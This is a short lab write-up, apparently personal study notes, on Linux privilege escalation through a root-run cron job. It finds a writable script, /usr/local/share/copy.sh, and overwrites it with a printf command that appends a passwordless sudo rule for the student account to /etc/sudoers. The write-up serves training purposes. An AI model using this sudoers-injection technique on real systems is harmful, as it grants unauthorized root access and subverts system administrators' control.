
Related to [[Privilege Escalation]],[[Post Exploitation]] and [[Linux Exploitation]]

Cron is a time based service that runs programs on a schedule, any process run by Cron is called a Cron Job.

The crontab file is a config file that is used by the Cron utility to store and track Cron Jobs.

We are going to be targetting cron jobs that have been scheduled by the root user as they will run with root privileges.

What follows is a writeup of the lab:

We see that we have a message on ~/message.txt, we can use grep to find any mention of this file to be able to access it:

``` bash
grep -rnw /usr - "/home/student/message"
```

We can see a shell script under /usr/local/share/copy.sh that copies that file onto /tmp/

We cant read that file due to permissions too, we can check exactly what our permission are with the sh script using:

``` bash
ls -al /usr/local/share/copy.sh
```

We see we have rwx permissions on that file.

``` bash
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

Through this when the copy.sh script is run the student account will gain sudo privileges without a password.

As a side note you can list all cron jobs visible via:

``` bash
crontab -l
```

